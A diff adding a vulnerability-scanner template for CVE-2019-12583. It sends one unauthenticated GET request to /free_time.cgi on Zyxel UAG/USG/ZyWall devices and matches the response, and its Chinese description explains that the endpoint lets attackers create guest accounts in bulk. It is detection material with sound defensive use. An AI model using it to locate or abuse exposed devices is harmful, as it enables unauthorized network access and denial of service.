@@ -1,0 +1,42 @@
+[info]
+author = "ave"
+description = "验证目标 Zyxel UAG/USG/ZyWall 设备是否存在 Free Time 组件未授权访问漏洞。攻击者无需认证即可直接访问 /free_time.cgi 账户生成器接口，批量创建访客账户获取未授权网络访问权限或引发服务拒绝。"
+id = "POC-AVE-2019-0052"
+name = "CVE-2019-12583 PoC"
+severity = "critical"
+tags = [
+    "cve-2019-12583",
+    "zyxel",
+    "uag",
+    "usg",
+    "zywall",
+]
+vuln_id = [
+    "CVE-2019-12583",
+    "AVE-2019-0052",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/free_time.cgi"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["free_time_redirect.cgi?u="]
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["&smsOnly=0"]
